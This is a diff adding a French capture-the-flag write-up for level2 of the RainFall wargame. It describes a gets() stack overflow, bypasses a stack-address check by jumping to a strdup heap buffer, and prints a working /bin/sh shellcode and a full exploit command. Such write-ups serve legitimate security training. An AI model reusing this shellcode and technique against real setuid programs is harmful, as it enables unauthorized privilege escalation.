@@ -1,0 +1,36 @@
+Connexion au level2 -> Bit NX desactive
+Check du home et des permissions du binaire -> Bit SUID level3
+Execution du binaire -> attente d'ecriture sur l'entree standard et reaffichage de la chaine sur la sortie (echo like)
+
+"""
+level2@RainFall:~$ ./level2
+abc
+abc
+"""
+
+Reecriture du code source en utilisant objdump -d et gdb avec peda
+Fonction gets non protege permettant l'overflow et d'ecraser le rEIP de la fonction p
+
+0xbffff6ac -> debut stackframe
+0xbffff6fc -> rEIP
+0xac - 0xfc = 80 octets (espace entre le debut de la stackframe et le rEIP) 
+
+shellcode 45 octets :
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+
+80 - 45 = 35
+
+35 * "0x90 + Shellcode + addr shellcode
+
+Test de buffer overflow avec le rEIP au debut du shellcode -> sans succes
+
+Explication : un if qui nous fais exit teste si l'adresse de retour commence par 0xb ce qui nous empeche d'utiliser la stack pour executer le shell code.
+
+La solution est d'utiliser la heap utilise par strdup qui copie le contenu de la variable ou l'on passe le shellcode, l'adresse ne change pas entre chaque execution
+
+0x804a008 -> adresse de retour d'strdup
+
+payload : python -c 'print "\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"'
+
+execution : python -c 'print "\x90" * 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"' > /tmp/b && cat /tmp/b - | `pwd`/level2
+
